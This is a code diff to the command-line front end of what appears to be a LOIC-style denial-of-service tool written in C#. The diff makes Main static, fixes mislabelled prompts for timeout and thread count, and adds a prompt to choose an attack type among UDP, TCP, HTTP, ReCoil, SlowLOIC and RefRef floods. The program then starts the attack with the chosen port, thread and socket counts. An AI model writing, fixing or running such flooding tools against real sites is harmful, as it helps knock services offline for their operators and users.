@@ -1,13 +1,11 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
+using System;
 using System.Text;
 namespace GAS.CLI
 {
     class Program
     {
-        GAS.Core.Manager Core = new GAS.Core.Manager();
-        void Main(string[] args)
+        static GAS.Core.Manager Core = new GAS.Core.Manager();
+       public static void Main(string[] args)
         {
             while (true)
             {
@@ -19,6 +17,7 @@ namespace GAS.CLI
                 Console.WriteLine("Subsite is {0}, do you want to change it?[y/n]", Core.Subsite);
                 if (Console.ReadLine().ToLower()[0] == 'y')
                     Core.Subsite = Console.ReadLine();
+    			Console.WriteLine("Select attack type [UDP/TCP/HTTP/ReCoil/SlowLOIC/RefRef]");
                 temp = Console.ReadLine();
                 if (temp != "RefRef")
                     Core.Method = (GAS.Core.AttackMethod) Enum.Parse(typeof(GAS.Core.AttackMethod), temp);
@@ -29,9 +28,9 @@ namespace GAS.CLI
                 }
                 Console.WriteLine("Enter port[80]");
                 Core.Port = int.Parse(Console.ReadLine());
-                Console.WriteLine("Enter port[30]");
+                Console.WriteLine("Enter timeout[30]");
                 Core.Timeout = int.Parse(Console.ReadLine());
-                Console.WriteLine("Enter port[10]");
+                Console.WriteLine("Enter thread count[10]");
                 Core.Threads = int.Parse(Console.ReadLine());
                 Console.WriteLine("Enter sockets per thread[50]");
                 Core.SPT = int.Parse(Console.ReadLine());
@@ -48,6 +47,7 @@ namespace GAS.CLI
                 Console.WriteLine("Append RANDOM Chars 2 Url ");
                 Core.AppendRANDOMCharsUrl = bool.Parse(Console.ReadLine());
                 Core.Start();
+				
             }
         }
     }
